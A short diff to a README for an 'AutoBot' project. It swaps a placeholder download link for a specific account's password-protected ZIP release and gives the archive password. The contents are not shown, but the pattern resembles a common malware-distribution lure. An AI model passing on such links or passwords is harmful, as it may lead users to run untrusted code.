@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/TBH-Ultimate-AutoBot/releases/latest/download/TBH-AutoBot.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/kevinivanov-hq1989z4/TBH-Ultimate-AutoBot/releases/download/download/TBH_AutoBot.zip)
 
 🔐 Archive password: `5868781`
 
